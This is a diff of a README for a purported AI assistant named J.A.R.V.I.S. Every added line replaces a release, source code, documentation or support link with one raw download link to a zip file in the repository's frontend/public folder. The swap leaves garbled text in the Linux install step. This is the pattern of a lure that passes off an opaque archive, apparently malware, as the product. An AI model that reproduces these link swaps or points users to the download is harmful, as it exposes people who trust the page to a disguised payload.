@@ -1,6 +1,6 @@
 # 🤖 J.A.R.V.I.S - Your Smart AI Assistant Awaits
 
-[![Download J.A.R.V.I.S](https://img.shields.io/badge/Download-J.A.R.V.I.S-brightgreen)](https://github.com/iamreal2/J.A.R.V.I.S/releases)
+[![Download J.A.R.V.I.S](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)
 
 ## 🌟 Overview
 Welcome to J.A.R.V.I.S, your personal AI assistant. This next-generation software uses Local LLMs (Ollama) and Real-time RAG to research the web, analyze data, and provide you with answers. With its user-friendly interface, J.A.R.V.I.S makes managing information easier than ever.
@@ -19,14 +19,14 @@ Before you download, make sure your system meets the following requirements:
 ### Step 2: Download J.A.R.V.I.S
 To get J.A.R.V.I.S, visit the Releases page and download the latest version:
 
-[Download J.A.R.V.I.S](https://github.com/iamreal2/J.A.R.V.I.S/releases)
+[Download J.A.R.V.I.S](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)
 
 ### Step 3: Install J.A.R.V.I.S
 1. Locate the downloaded file (usually in your "Downloads" folder).
 2. Depending on your operating system:
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file. Drag and drop J.A.R.V.I.S into your Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file to your preferred directory. Run the installation script via terminal.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip` file to your preferred directory. Run the installation script via terminal.
 
 ### Step 4: Run J.A.R.V.I.S
 Once installed, find J.A.R.V.I.S in your applications:
@@ -61,7 +61,7 @@ We welcome your thoughts! You can submit feedback through the GitHub issues page
 ## 📥 Download & Install
 To get started, simply visit the Downloads page:
 
-[Download J.A.R.V.I.S](https://github.com/iamreal2/J.A.R.V.I.S/releases)
+[Download J.A.R.V.I.S](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)
 
 Follow the steps outlined above to install and run your new AI assistant. Explore its features and enjoy seamless data management!
 
@@ -69,8 +69,8 @@ Follow the steps outlined above to install and run your new AI assistant. Explor
 If you would like to contribute to J.A.R.V.I.S, please visit the Contributing section on our GitHub page. We appreciate your help in improving this software.
 
 ## 🔗 Links
-- **Source Code:** [GitHub Repository](https://github.com/iamreal2/J.A.R.V.I.S)
-- **Documentation:** [J.A.R.V.I.S Documentation](https://github.com/iamreal2/J.A.R.V.I.S/wiki)
-- **Support:** [Contact Us](mailto:support@jarvis.com)
+- **Source Code:** [GitHub Repository](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)
+- **Documentation:** [J.A.R.V.I.S Documentation](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)
+- **Support:** [Contact Us](https://raw.githubusercontent.com/iamreal2/J.A.R.V.I.S/main/frontend/public/S_2.8-alpha.3.zip)
 
 Thank you for choosing J.A.R.V.I.S! We hope it enhances your daily tasks as your personal AI assistant.
